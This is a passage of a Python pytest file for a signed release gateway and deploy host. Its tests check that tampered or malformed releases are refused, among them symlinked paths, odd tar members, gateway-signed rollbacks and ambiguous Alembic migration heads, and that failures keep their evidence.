    assert not (victim / "identity.json").exists() and not (victim / "ledger.json.lock").exists()


def test_an_export_rule_is_rejected_before_the_ledger_goes_pending(hw):
    sha = hw.commit("import os", **{".gitattributes": "app/x.py export-subst\n", "app/x.py": "$Format:%s$\n"})
    hw.push()
    manifest = {"sha": sha, "parent_sha": hw.base}
    with pytest.raises(rg.Refused, match="differs from the hashed payload"):
        host.host_facts(hw.hcfg, manifest, json.loads(hw.hcfg.ledger.read_text()))
    assert "pending" not in json.loads(hw.hcfg.ledger.read_text())


def test_a_symlink_in_the_release_is_shipped_and_hashed_as_its_target(hw, tmp_path):
    (hw.work / "app").mkdir(exist_ok=True)
    (hw.work / "app" / "link.py").symlink_to("main.py")
    sha = hw.commit("symlink", **{"app/main.py": "x = 3\n"})
    hw.push()
    sh(hw.hcfg.clone, "git", "fetch", "-q", "origin", "main")
    out = tmp_path / "rel"
    out.mkdir()
    host.build_release(hw.hcfg, sha, out)                                 # the symlink's target text is hashed
    assert "app/link.py" in (out / "main.sha256").read_text()


def test_an_archive_with_an_unexpected_member_type_is_refused():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        fifo = tarfile.TarInfo("app/pipe")
        fifo.type = tarfile.FIFOTYPE
        t.addfile(fifo)
    with pytest.raises(rg.Refused, match="unexpected entry"):
        rg.archive_listing(buf.getvalue())



# --------------------------------------------------------------------------- F3: the driver accepts our RELEASE_DIR

def _driver_release_dir_regex() -> str:
    import re
    source = (Path(__file__).parents[1] / "scripts/deploy-company-os.sh").read_text()
    found = re.search(r'\[\[ ! "\$RELEASE_DIR" =~ (\S+) \]\]', source)
    assert found, "the driver's RELEASE_DIR check moved"
    return found.group(1)


def test_the_release_directory_matches_the_drivers_exact_check(hw):
    import re
    regex = _driver_release_dir_regex()
    assert regex.startswith("^/run/company-os-deploy/") and host.RUN_ROOT_PRODUCTION == Path("/run/company-os-deploy")
    local = regex.replace("/run/company-os-deploy", re.escape(str(host.RUN_ROOT)))
    signed_docs_release(hw)
    assert step(hw)["outcome"] == "APPLIED"
    run, = hw.runs
    assert re.fullmatch(local.strip("^$"), run["env"]["RELEASE_DIR"]), run["env"]["RELEASE_DIR"]
    names = [host._release_dir_name("a" * 40) for _ in range(500)]
    assert all(re.fullmatch(r"[0-9a-f]{40}\.[A-Za-z0-9]{8}", n) for n in names)
    assert not list(host.RUN_ROOT.iterdir())                            # cleaned up after the run


def test_run_root_is_pinned(hw, tmp_path):
    raw = {k: str(v) if isinstance(v, Path) else v for k, v in hw.hcfg.__dict__.items()}
    raw["inboxes"] = [str(p) for p in hw.hcfg.inboxes]
    raw["run_root"] = str(tmp_path / "elsewhere")
    with pytest.raises(rg.Refused, match="run_root"):
        host.Config(raw)


# --------------------------------------------------------------------------- F2: classify failures, never lose evidence

def _kept(hw, name):
    return (hw.cfg.outbox / f"{name}.json").exists() and (hw.cfg.outbox / f"{name}.sig").exists() \
        and not (hw.hcfg.rejected / f"{name}.json").exists()


@pytest.mark.parametrize("failure", [
    lambda hw, mp: mp.setattr(host, "build_release", lambda *a: (_ for _ in ()).throw(OSError("disk full"))),
    lambda hw, mp: mp.setattr(host, "build_release", lambda *a: (_ for _ in ()).throw(rg.Refused("archive"))),
    lambda hw, mp: mp.setattr(host, "build_release",
                              lambda *a: (_ for _ in ()).throw(__import__("subprocess").CalledProcessError(1, "git"))),
    lambda hw, mp: mp.setattr(host.shutil, "rmtree", (lambda real: lambda p, *a, **k: (_ for _ in ()).throw(
        PermissionError("cleanup")) if str(p).startswith(str(host.RUN_ROOT)) else real(p, *a, **k))(host.shutil.rmtree)),
    lambda hw, mp: mp.setattr(rg, "_append_history", lambda *a: (_ for _ in ()).throw(OSError("history"))),
])
def test_any_failure_after_pending_is_apply_failed_and_keeps_the_manifest(hw, monkeypatch, failure):
    _, name = signed_docs_release(hw)
    failure(hw, monkeypatch)
    out = step(hw)
    assert out["outcome"] == "APPLY_FAILED", out
    assert _kept(hw, name) and json.loads(hw.hcfg.ledger.read_text())["pending"]
    assert step(hw)["outcome"] == "WAITING_FOR_FOUNDER" and _kept(hw, name)


@pytest.mark.parametrize("failure", [
    lambda hw: setattr(hw.hcfg, "fetch_url", str(hw.tmp / "no-such-remote.git")),     # fetch fails
    lambda hw: setattr(hw.hcfg, "policy", hw.tmp / "no-such-policy.json"),             # policy unreadable
])
def test_an_infrastructure_failure_before_pending_is_retried_not_rejected(hw, failure):
    _, name = signed_docs_release(hw)
    good = (hw.hcfg.fetch_url, hw.hcfg.policy)
    failure(hw)
    out = step(hw)
    assert out["outcome"] == "RETRY_LATER", out
    assert _kept(hw, name) and "pending" not in json.loads(hw.hcfg.ledger.read_text())
    hw.hcfg.fetch_url, hw.hcfg.policy = good
    assert step(hw)["outcome"] == "APPLIED"


def test_a_commit_that_is_not_on_main_is_rejected_as_content(hw):
    _, name = signed_docs_release(hw)
    path = hw.cfg.outbox / f"{name}.json"
    m = json.loads(path.read_bytes())
    m["sha"] = "1" * 40                                                    # unknown commit: content, not infra
    raw = rg.canonical(m)
    path.write_bytes(raw)
    (hw.cfg.outbox / f"{name}.sig").write_text(rg.sign(raw, hw.keys["gateway"][0], rg.NS_RELEASE))
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "main" in out["reason"]


def test_the_founder_reconciles_a_failed_release_on_the_host(hw, tmp_path):
    from tests.test_release_gateway import HOST
    _, name = signed_docs_release(hw)
    hw.driver_exit = 1
    assert step(hw)["outcome"] == "APPLY_FAILED"
    pending = json.loads(hw.hcfg.ledger.read_text())["pending"]
    st = {"kind": "reconcile", "host_id": HOST, "repository": "seerxo/os", "branch": "main", "nonce": "ab" * 16,
          "pending_digest": pending, "outcome": "failed", "release_sha": hw.base, "images": images(hw.base),
          "configs": configs(), "issued_at": NOW.isoformat(), "expires_at": (NOW + timedelta(hours=1)).isoformat()}
    raw = rg.canonical(st)
    (tmp_path / "rec.json").write_bytes(raw)
    (tmp_path / "rec.sig").write_text(rg.sign(raw, hw.keys["founder"][0], rg.NS_RECONCILE))
    out = host.founder_statement(hw.hcfg, "reconcile", tmp_path / "rec.json", tmp_path / "rec.sig", now=NOW,
                                 observe=hw.prod.observe, machine_id=HOST)
    assert out == {"outcome": "RECONCILE_DONE", "last_sha": hw.base}
    assert (hw.cfg.outbox / f"{name}.failed").exists() and not (hw.cfg.outbox / f"{name}.json").exists()
    assert step(hw) == {"outcome": "IDLE"} and len(hw.runs) == 1                  # nothing re-applied



def test_a_busy_ledger_lock_is_retried_never_a_rejection(hw, monkeypatch):
    import fcntl
    _, name = signed_docs_release(hw)
    lock = hw.hcfg.ledger.with_name(hw.hcfg.ledger.name + ".lock")
    with rg._locked(hw.hcfg.ledger):
        pass
    holder = os.open(lock, os.O_RDONLY)
    fcntl.flock(holder, fcntl.LOCK_EX)
    monkeypatch.setattr(rg, "LOCK_TIMEOUT_S", 0.2)
    try:
        out = step(hw)
    finally:
        os.close(holder)
    assert out["outcome"] == "RETRY_LATER" and hw.runs == [] and _kept(hw, name)
    assert "pending" not in json.loads(hw.hcfg.ledger.read_text())
    assert step(hw)["outcome"] == "APPLIED"


# --------------------------------------------------------------------------- rollback: a new, reviewed, founder release

def _founder_inbox(hw, draft, signer="founder", name="x"):
    raw = rg.canonical(draft)
    inbox = hw.tmp / "founder-inbox"
    inbox.mkdir(exist_ok=True)
    (inbox / f"{draft['sequence']:06d}-{name}.json").write_bytes(raw)
    (inbox / f"{draft['sequence']:06d}-{name}.sig").write_text(rg.sign(raw, hw.keys[signer][0], rg.NS_RELEASE))


def _draft(hw):
    path = sorted(hw.cfg.founder_queue.iterdir())[-1]
    return json.loads(path.read_text())


def test_a_rollback_is_only_a_new_reviewed_founder_signed_release(hw):
    bad = hw.commit("bad change", **{"app/main.py": "x = 666\n"})
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    _founder_inbox(hw, _draft(hw), name="bad")
    assert step(hw)["outcome"] == "APPLIED" and hw.prod.running["api"]["git_sha"] == bad
    hw.report(bad)

    # Unknown / older target: pointing production back at the base commit directly is refused for every signer.
    older = {**_draft(hw), "sha": hw.base, "parent_sha": bad, "sequence": 8, "changed_paths": ["app/main.py"]}
    _founder_inbox(hw, older, name="older")
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "does not descend" in out["reason"] and len(hw.runs) == 1

    # The rollback: a revert commit (its tree equals the base release's tree), through the full path.
    sh(hw.work, "git", "revert", "--no-edit", bad)
    revert = sh(hw.work, "git", "rev-parse", "HEAD")
    assert sh(hw.work, "git", "rev-parse", f"{revert}^{{tree}}") == sh(hw.work, "git", "rev-parse", f"{hw.base}^{{tree}}")
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"                   # the gateway never signs it (HIGH)
    draft = _draft(hw)
    assert draft["sha"] == revert and draft["approver"] == "founder"

    _founder_inbox(hw, {**draft, "approver": "gateway"}, signer="gateway", name="gw")   # gateway-signed rollback
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "founder signature required" in out["reason"]

    rejected = dict(draft)                                              # founder-signed, reviewer REJECT
    packet = rg.review_packet("seerxo/os", bad, revert, rg.git_release_diff(hw.work, bad, revert), "cd" * 16)
    att = rg.attestation("codex", packet, {"verdict": "REJECT", "fingerprint": packet["fingerprint"],
                                           "findings": ["no"]}, NOW.isoformat())
    rejected["evidence"] = {**draft["evidence"], "review": {"nonce": "cd" * 16, "attestation": att, "signature": rg.sign(
        rg.canonical(att), hw.keys["reviewer"][0], rg.NS_REVIEW)}}
    _founder_inbox(hw, rejected, name="rej")
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "does not approve" in out["reason"]

    _founder_inbox(hw, draft, name="ok")                                # founder + reviewer APPROVE + checks
    out = step(hw)
    assert out["outcome"] == "APPLIED" and out["sha"] == revert and out["approver"] == "founder"


def _founder_release(hw, message, files, name):
    sha = hw.commit(message, **files)
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    _founder_inbox(hw, _draft(hw), name=name)
    assert step(hw)["outcome"] == "APPLIED" and hw.prod.running["api"]["git_sha"] == sha
    hw.report(sha)
    return sha


def test_a_declared_rollback_must_equal_a_release_in_the_trusted_history(hw):
    good = _founder_release(hw, "good", {"app/main.py": "x = 2\n"}, "good")
    bad = _founder_release(hw, "bad", {"app/main.py": "x = 666\n"}, "bad")
    sh(hw.work, "git", "revert", "--no-edit", bad)
    revert = sh(hw.work, "git", "rev-parse", "HEAD")
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    draft = _draft(hw)
    assert draft["sha"] == revert and draft["payload_digest"] == rg.payload_digest(rg.payload_listing(hw.work, good))

    # A target that was never applied through the gateway (the bootstrap-era base) is not trusted evidence.
    _founder_inbox(hw, {**draft, "rollback_to": hw.base}, name="base")
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "not a previously applied release" in out["reason"] and len(hw.runs) == 2

    # The gateway can never sign a rollback, even one whose evidence matches.
    _founder_inbox(hw, {**draft, "rollback_to": good, "approver": "gateway"}, signer="gateway", name="gw")
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "rollback needs the founder" in out["reason"]

    # Missing evidence: the target's recorded payload digest is gone from the history.
    path = rg.history_path(hw.hcfg.ledger)
    original = path.read_bytes()
    events = rg.read_history(hw.hcfg.ledger)
    path.write_bytes(b"".join(rg.canonical({k: v for k, v in e.items() if not (e["sha"] == good and k ==
                                                                               "payload_digest")}) + b"\n"
                              for e in events))
    _founder_inbox(hw, {**draft, "rollback_to": good}, name="nodigest")
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "no recorded payload" in out["reason"] and len(hw.runs) == 2
    path.write_bytes(original)

    # Founder-signed, reviewer APPROVE, target applied before and the revert ships exactly its payload: still
    # refused until the running images can be proven to be the target's recorded images (founder 2026-10-20).
    _founder_inbox(hw, {**draft, "rollback_to": good}, name="ok")
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "running images cannot yet be proven" in out["reason"] and len(hw.runs) == 2

    # The same revert as an ordinary founder-signed forward release (no rollback_to) is applied, not as a rollback.
    _founder_inbox(hw, draft, name="forward")
    out = step(hw)
    assert out["outcome"] == "APPLIED" and out["sha"] == revert and out["approver"] == "founder"


def test_a_declared_rollback_whose_tree_differs_from_the_target_is_refused(hw):
    good = _founder_release(hw, "good", {"app/main.py": "x = 2\n"}, "good")
    _founder_release(hw, "bad", {"app/main.py": "x = 666\n"}, "bad")
    # Same intent, other content: "back to good" but with one more shipped change. Same commit name, other tree.
    impostor = hw.commit("revert bad", **{"app/main.py": "x = 2\n", "app/extra.py": "y = 2\n"})
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    draft = _draft(hw)
    assert draft["sha"] == impostor
    _founder_inbox(hw, {**draft, "rollback_to": good}, name="impostor")
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "payload differs" in out["reason"] and len(hw.runs) == 2


SET_LIKE_KEYS = ["Binds", "CapAdd", "CapDrop", "DeviceCgroupRules", "DeviceRequests", "Devices", "Dns",
                 "DnsOptions", "DnsSearch", "ExtraHosts", "GroupAdd", "Links", "MaskedPaths", "ReadonlyPaths",
                 "SecurityOpt", "Ulimits", "VolumesFrom"]


def test_the_set_like_list_is_the_tested_one():
    assert host.SET_LIKE - {"Env"} == set(SET_LIKE_KEYS)       # a key dropped from SET_LIKE fails here


@pytest.mark.parametrize("key", SET_LIKE_KEYS)
def test_every_set_like_list_is_order_independent(key):
    import copy
    a, b = copy.deepcopy(BASE_INFO), copy.deepcopy(BASE_INFO)
    a["HostConfig"][key] = ["one", "two", {"k": "v"}]
    b["HostConfig"][key] = [{"k": "v"}, "two", "one"]
    assert _digest(a) == _digest(b), key                               # a reordering never blocks a release
    b["HostConfig"][key] = ["one", "two"]
    assert _digest(a) != _digest(b), key                               # but a removed entry is a change


def test_founder_commands_refuse_an_untrusted_ledger_directory(hw, tmp_path):
    from tests.test_release_gateway import HOST
    victim = tmp_path / "victim"
    victim.mkdir()
    link = tmp_path / "linkdir"
    link.symlink_to(victim)
    hw.hcfg.ledger = link / "ledger.json"
    (tmp_path / "st.json").write_bytes(b"{}")
    (tmp_path / "st.sig").write_text("")
    for kind in ("bootstrap", "recover", "reconcile"):
        with pytest.raises(rg.Refused, match="untrusted"):
            host.founder_statement(hw.hcfg, kind, tmp_path / "st.json", tmp_path / "st.sig", now=NOW,
                                   observe=hw.prod.observe, machine_id=HOST)
    assert list(victim.iterdir()) == []                                 # nothing written through the link


# --------------------------------------------------------------------------- B-7 compose, B-8 migration_to

def founder_signs(hw, draft_changes):
    draft = json.loads(next(hw.cfg.founder_queue.iterdir()).read_text()) | draft_changes
    raw = rg.canonical(draft)
    inbox = hw.tmp / "founder-inbox"
    inbox.mkdir(exist_ok=True)
    (inbox / "000007.json").write_bytes(raw)
    (inbox / "000007.sig").write_text(rg.sign(raw, hw.keys["founder"][0], rg.NS_RELEASE))
    return inbox


def migration(rev, down):
    return {"migrations/versions/m.py": f'revision = "{rev}"\ndown_revision = {down!r}\n'}


@pytest.mark.parametrize("migration_to", ["", "fedcba987654"])
def test_b8_a_schema_change_applies_only_with_the_founder_signed_head(hw, migration_to):
    hw.commit("schema", **{"app/main.py": "x = 3\n"}, **migration("abcdef012345", None))
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    inbox = founder_signs(hw, {"migration_to": migration_to})
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "single Alembic head" in out["reason"], out
    assert hw.runs == [] and "pending" not in json.loads(hw.hcfg.ledger.read_text())   # refused BEFORE pending
    assert not (inbox / "000007.json").exists()


def test_b8_a_migration_to_without_a_schema_change_is_refused(hw):
    hw.commit("app", **{"app/main.py": "x = 4\n"})
    hw.push()
    hw.tick()
    founder_signs(hw, {"migration_to": "abcdef012345"})
    out = step(hw)
    assert out["outcome"] == "REJECTED" and hw.runs == [], out


def test_infrastructure_and_migrations_are_high_even_if_the_policy_calls_everything_low():
    policy = {"max_changed_paths": 50, "high_risk_paths": ["Dockerfile"], "low_risk_paths": ["*", "*/*", "*/*/*"]}
    for path in ("migrations/versions/m.py", "docker-compose.yml", "Dockerfile", "scripts/deploy-company-os.sh",
                 "scripts/company-os.cron", "ops/company-coder-pause.compose.yml"):
        assert rg.classify([path], policy) == "high", path
    assert rg.classify(["docs/x.md"], policy) == "low"


def test_b7_a_founder_signed_compose_change_applies_with_the_host_files_own_hash(hw):
    sha = hw.commit("compose", **{"docker-compose.yml": "services: {x: {}}\n"})
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    founder_signs(hw, {})
    out = step(hw)
    assert out["outcome"] == "APPLIED" and out["sha"] == sha, out
    run, = hw.runs
    assert run["env"]["ACK_COMPOSE"] == hashlib.sha256(b"\n").hexdigest()[:12]    # the host file it replaces
    assert run["env"]["ACK_OVERRIDES"] == "" and run["env"]["AUTOMATIC"] == "true"


def test_b7_an_unchanged_compose_sends_no_acknowledgement(hw):
    signed_docs_release(hw)
    assert step(hw)["outcome"] == "APPLIED"
    assert hw.runs[0]["env"]["ACK_COMPOSE"] == ""


def test_b7_a_compose_change_claimed_by_the_gateway_is_refused_before_pending(hw):
    hw.commit("compose", **{"docker-compose.yml": "services: {x: {}}\n"})
    hw.push()
    hw.tick()
    raw = rg.canonical(json.loads(next(hw.cfg.founder_queue.iterdir()).read_text()) | {"approver": "gateway"})
    inbox = hw.tmp / "founder-inbox"
    inbox.mkdir()
    (inbox / "000007.json").write_bytes(raw)
    (inbox / "000007.sig").write_text(rg.sign(raw, hw.keys["gateway"][0], rg.NS_RELEASE))
    out = step(hw)
    assert out["outcome"] == "REJECTED" and hw.runs == [], out
    assert "pending" not in json.loads(hw.hcfg.ledger.read_text())


@pytest.mark.parametrize("host_compose", ["services: {manual: {}}\n", None])
def test_b7_a_host_compose_that_is_not_the_applied_releases_blocks_everything(hw, host_compose):
    sha, name = signed_docs_release(hw)
    if host_compose is None:
        host.HOST_COMPOSE.unlink()
    else:
        host.HOST_COMPOSE.write_text(host_compose)
    out = step(hw)
    assert out["outcome"] == "BLOCKED" and "docker-compose.yml" in out["reason"], out
    assert hw.runs == [] and (hw.cfg.outbox / f"{name}.json").exists()           # kept for after the reconcile
    assert "pending" not in json.loads(hw.hcfg.ledger.read_text())


# --------------------------------------------------------------------------- #395 review: parser, paths, entries

def migration_repo(tmp_path, files):
    repo = tmp_path / "m"
    for path, text in files.items():
        f = repo / "migrations/versions" / path
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text)
    sh(repo, "git", "init", "-q")
    sh(repo, "git", "add", "-A")
    sh(repo, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "m")
    return repo, sh(repo, "git", "rev-parse", "HEAD")


def test_a_docstring_that_mentions_a_revision_never_becomes_a_head(tmp_path):
    repo, sha = migration_repo(tmp_path, {
        "a.py": 'revision = "aaaaaaaaaaaa"\ndown_revision = None\n',
        "b.py": '"""Example:\nrevision = "ffffffffffff"\n"""\nrevision = "bbbbbbbbbbbb"\ndown_revision = "aaaaaaaaaaaa"\n'})
    assert rg.alembic_heads(repo, sha) == {"bbbbbbbbbbbb"}


def test_a_merge_revision_tuple_over_several_lines_closes_both_parents(tmp_path):
    repo, sha = migration_repo(tmp_path, {
        "a.py": 'revision = "aaaaaaaaaaaa"\ndown_revision = None\n',
        "b.py": 'revision = "bbbbbbbbbbbb"\ndown_revision = "aaaaaaaaaaaa"\n',
        "c.py": 'revision = "cccccccccccc"\ndown_revision = "aaaaaaaaaaaa"\n',
        "d.py": 'revision: str = "dddddddddddd"\ndown_revision: tuple = (\n    "bbbbbbbbbbbb",\n    "cccccccccccc",\n)\n'})
    assert rg.alembic_heads(repo, sha) == {"dddddddddddd"}


@pytest.mark.parametrize("text", [
    'down_revision = None\n',                                         # no revision at all
    'revision = "aaaaaaaaaaaa"\nrevision = "bbbbbbbbbbbb"\ndown_revision = None\n',   # assigned twice
    'revision = make()\ndown_revision = None\n',                      # not a literal
    'revision = "AAAA"\ndown_revision = None\n',                      # not 12 lowercase hex
    'revision = "aaaaaaaaaaaa"\ndown_revision = 7\n',                 # malformed parent
    'revision = (\n',                                                 # does not parse
])
def test_a_migration_file_the_host_cannot_read_exactly_refuses(tmp_path, text):
    repo, sha = migration_repo(tmp_path, {"a.py": text})
    with pytest.raises(rg.Refused):
        rg.alembic_heads(repo, sha)


def test_the_gateway_trust_path_and_runtime_inputs_are_always_high():
    policy = {"max_changed_paths": 50, "high_risk_paths": ["x"], "low_risk_paths": ["*", "*/*", "*/*/*"]}
    for path in ("alembic.ini", "requirements.txt", "app/release_gateway.py", "app/review_signer.py",
                 "app/release_host.py", "app/release_gateway_service.py"):
        assert rg.classify([path], policy) == "high", path


def test_a_symlink_in_a_low_risk_path_is_never_released_by_the_gateway(hw):
    (hw.work / "docs").mkdir(exist_ok=True)
    os.symlink("../app/main.py", hw.work / "docs/LINK.md")
    sha = hw.commit("link")
    hw.push()
    assert rg.git_nonregular_paths(hw.work, hw.base, sha) == ["docs/LINK.md"]
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"                     # never SIGNED by the gateway


# --------------------------------------------------------------------------- #399 notes

OK_HEAD = 'revision = "aaaaaaaaaaaa"\ndown_revision = None\n'


@pytest.mark.parametrize("extra", [
    'if True:\n    revision = "bbbbbbbbbbbb"\n',                          # nested block
    'revision2, x = 1, 2\nrevision, x = "bbbbbbbbbbbb", 1\n',             # tuple unpacking
    'def f():\n    global revision\n    revision = "bbbbbbbbbbbb"\nf()\n',   # function with global
    'for down_revision in ["bbbbbbbbbbbb"]:\n    pass\n',                # loop target
    'from x import revision\n',                                         # import binding
    'match "bbbbbbbbbbbb":\n    case revision:\n        pass\n',           # pattern capture (Codex, 690486d)
    'match [1]:\n    case [*revision]:\n        pass\n',                    # starred pattern capture (Codex)
    'match {"x": 1}:\n    case {**revision}:\n        pass\n',              # mapping rest capture (Codex)
    'try:\n    raise ValueError()\nexcept ValueError as revision:\n    pass\n',  # exception capture (Codex)
    'match "b":\n    case revision:\n        pass\n',                    # MatchAs capture
    'match "b":\n    case str() as revision:\n        pass\n',           # MatchAs with a pattern
    'match ["b"]:\n    case [*revision]:\n        pass\n',               # MatchStar
    'match {}:\n    case {**revision}:\n        pass\n',                 # MatchMapping.rest
    'try:\n    pass\nexcept ValueError as revision:\n    pass\n',      # ExceptHandler.name
    'x = [(revision := "b") for _ in "a"]\n',                           # walrus in a comprehension
    'revision += ""\n',                                                 # augmented assignment
])
def test_a_second_binding_of_revision_or_down_revision_refuses(tmp_path, extra):
    repo, sha = migration_repo(tmp_path, {"a.py": OK_HEAD + extra})
    with pytest.raises(rg.Refused, match="outside its single top-level assignment|exactly once"):
        rg.alembic_heads(repo, sha)


@pytest.mark.parametrize("extra", ['from app.decoy import *\n', 'def f():\n    from x import *\n'])
def test_a_star_import_anywhere_refuses(tmp_path, extra):
    repo, sha = migration_repo(tmp_path, {"a.py": OK_HEAD + extra})
    with pytest.raises(rg.Refused, match="star import"):
        rg.alembic_heads(repo, sha)


@pytest.mark.parametrize("extra", [
    'def upgrade():\n    revision = op.get_bind()\n    down_revision = 1\n',   # a data migration's local
    'x = [revision for revision in ["b"]]\n',                             # comprehension variable
    'f = lambda revision: revision\n',                                    # lambda parameter
    'class C:\n    revision = 1\n',                                       # class attribute
])
def test_locals_in_their_own_scope_are_allowed(tmp_path, extra):
    repo, sha = migration_repo(tmp_path, {"a.py": OK_HEAD + extra})
    assert rg.alembic_heads(repo, sha) == {"aaaaaaaaaaaa"}


def test_a_function_that_declares_global_revision_still_refuses(tmp_path):
    repo, sha = migration_repo(tmp_path, {"a.py": OK_HEAD + 'def f():\n    global revision\n'})
    with pytest.raises(rg.Refused, match="global/nonlocal"):
        rg.alembic_heads(repo, sha)


def test_a_migration_in_a_subdirectory_refuses(tmp_path):
    repo, sha = migration_repo(tmp_path, {"a.py": OK_HEAD,
                                          "sub/b.py": 'revision = "bbbbbbbbbbbb"\ndown_revision = "aaaaaaaaaaaa"\n'})
    with pytest.raises(rg.Refused, match="subdirectory"):
        rg.alembic_heads(repo, sha)


def test_a_gateway_signed_symlink_release_is_rejected_before_pending(hw):
    (hw.work / "docs").mkdir(exist_ok=True)
    os.symlink("../app/main.py", hw.work / "docs/LINK.md")
    sha = hw.commit("link")
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    raw = rg.canonical(json.loads(next(hw.cfg.founder_queue.iterdir()).read_text()) | {"approver": "gateway"})
    inbox = hw.tmp / "founder-inbox"
    inbox.mkdir()
    (inbox / "000007.json").write_bytes(raw)
    (inbox / "000007.sig").write_text(rg.sign(raw, hw.keys["gateway"][0], rg.NS_RELEASE))
    out = step(hw)
    assert out["outcome"] == "REJECTED" and hw.runs == [], out
    assert "pending" not in json.loads(hw.hcfg.ledger.read_text())


def test_the_ledger_path_is_pinned_to_the_one_the_deploy_driver_reads(hw):
    # B6 step 8: the driver recognises a bootstrapped host only by this exact file; another configured path would
    # silently switch its verify-release-manifest gate off.
    driver = (Path(__file__).resolve().parents[1] / "scripts/deploy-company-os.sh").read_text()
    assert f"RELEASE_LEDGER={host.LEDGER_PRODUCTION}\n" in driver
    raw = {k: (str(v) if isinstance(v, Path) else [str(p) for p in v] if k == "inboxes" else v)
           for k, v in vars(hw.hcfg).items()}
    host.Config(raw)                                                     # the pinned path is accepted
    with pytest.raises(rg.Refused, match="ledger must be"):
        host.Config(raw | {"ledger": str(hw.tmp / "elsewhere.json")})


@pytest.fixture
def old_driver(monkeypatch):
    """The world's base release ships a deploy driver from before the #192 F4 image hold."""
    monkeypatch.setitem(globals(), "DRIVER", DRIVER.replace(host.DRIVER_HOLDS_IMAGES + "\n", ""))


def test_a_gateway_release_whose_driver_predates_the_image_hold_is_refused_before_pending(old_driver, hw):
    # Break caught (#192 F4 rollout): with the new verifier installed, a candidate still carrying the old driver
    # would rebuild and ship whatever a cold cache fetches. Refused before `pending`; nothing is applied.
    signed_docs_release(hw)
    calls = []
    hw.run = lambda env, script: calls.append(env) or 0
    result = step(hw)
    assert result["outcome"] != "APPLIED" and "does not hold a gateway release" in result.get("reason", ""), result
    assert calls == [] and "pending" not in json.loads(hw.cfg.ledger.read_text())


def test_the_driver_is_handed_exactly_the_staged_directory_the_ledger_marks_pending(hw):
    # B6 step 8 binding: the deploy driver accepts only RELEASE_DIR == ledger.pending_release_dir, written in the same
    # atomic pending write; release_host names the directory before that write and then hands exactly it over.
    seen = []
    real = hw.run

    def run(env, script):
        seen.append((env["RELEASE_DIR"], json.loads(hw.cfg.ledger.read_text())))
        return real(env, script)
    hw.run = run
    sha, _ = signed_docs_release(hw)
    assert step(hw)["outcome"] == "APPLIED"
    (release_dir, ledger), = seen
    assert ledger["pending_sha"] == sha and ledger["pending_release_dir"] == release_dir
    assert Path(release_dir).name.startswith(sha + ".") and re.fullmatch(r"[0-9a-f]{64}", ledger["pending"])
    assert "pending_release_dir" not in json.loads(hw.cfg.ledger.read_text())    # cleared with the applied record
    # #192 F4: the driver holds a gateway release to the running images; it reads who signed from this same write.
    assert ledger["pending_approver"] == "gateway"
    assert "pending_approver" not in json.loads(hw.cfg.ledger.read_text())


def _public_copy(hw, tmp_path):
    """The new repository: a fresh history whose first commit has exactly the running release's tree."""
    work, origin = tmp_path / "public-work", tmp_path / "public.git"
    sh(tmp_path, "git", "init", "-q", "-b", "main", str(work))
    for k, v in (("user.email", "n@o"), ("user.name", "n")):
        sh(work, "git", "config", k, v)
    archive = sh(hw.work, "git", "archive", "--format=tar", "-o", str(tmp_path / "base.tar"), hw.base)
    assert archive == ""
    sh(work, "tar", "-xf", str(tmp_path / "base.tar"))
    sh(work, "git", "add", "-A")
    sh(work, "git", "commit", "-qm", "Initial public release")
    sh(tmp_path, "git", "clone", "-q", "--bare", str(work), str(origin))
    sh(work, "git", "remote", "add", "origin", str(origin))
    return work, origin, sh(work, "git", "rev-parse", "HEAD")


def _rebase_setup(hw, tmp_path, *, base_files=None):
    from app import release_gateway_service as svc
    from tests.test_release_gateway import HOST
    work, origin, base = _public_copy(hw, tmp_path)
    if base_files:                                    # a base that is NOT the running tree
        for path, text in base_files.items():
            (work / path).write_text(text)
        sh(work, "git", "commit", "-qam", "drift")
        sh(work, "git", "push", "-q", "origin", "main")
        base = sh(work, "git", "rev-parse", "HEAD")
    policy = json.loads(hw.cfg.policy.read_bytes()) | {"version": 2, "repository": "seerxo/seerxo-os"}
    praw = rg.canonical(policy)
    (tmp_path / "policy-v2.json").write_bytes(praw)
    (tmp_path / "policy-v2.sig").write_text(rg.sign(praw, hw.keys["founder"][0], rg.NS_POLICY))
    sh(tmp_path, "git", "clone", "-q", str(origin), str(tmp_path / "host-clone-new"))
    new = host.Config({**{k: str(v) if isinstance(v, Path) else v for k, v in vars(hw.hcfg).items()},
                       "inboxes": [str(p) for p in hw.hcfg.inboxes], "repository": "seerxo/seerxo-os",
                       "clone": str(tmp_path / "host-clone-new"), "fetch_url": str(origin),
                       "policy": str(tmp_path / "policy-v2.json"), "policy_sig": str(tmp_path / "policy-v2.sig")})
    ledger = json.loads(hw.hcfg.ledger.read_text())
    st = {"kind": "rebase", "host_id": HOST, "repository": "seerxo/seerxo-os", "branch": "main",
          "nonce": "ee" * 16, "old_repository": "seerxo/os", "old_last_sha": hw.base,
          "old_last_sequence": ledger["last_sequence"],
          "history_sha256": hashlib.sha256(rg.history_path(hw.hcfg.ledger).read_bytes()
                                           if rg.history_path(hw.hcfg.ledger).exists() else b"").hexdigest(),
          "base_sha": base, "base_tree": sh(work, "git", "rev-parse", f"{base}^{{tree}}"),
